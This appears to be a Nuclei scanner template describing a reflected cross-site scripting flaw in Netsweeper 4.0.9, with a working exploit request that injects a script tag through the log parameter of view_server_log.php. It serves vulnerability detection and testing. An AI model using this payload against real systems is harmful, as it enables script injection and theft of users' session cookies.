# Nuclei Template: Netsweeper 4.0.9 - Cross-Site Scripting
**Template ID:** netsweeper-rxss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** High
**CWE:** CWE-80
**Source:** Nuclei Template (`netsweeper-rxss.yaml`)

## Vulnerability Information & PoC

## Description
Netsweeper 4.0.9 contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/webadmin/reporter/view_server_log.php?server=localhost&act=stats&filename=&offset=1&count=1000&sortorder=&log=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&offset=&sortitem=&filter=
```

## References
- https://packetstormsecurity.com/files/download/133034/netsweeper-issues.tgz
- https://www.exploit-db.com/exploits/37930
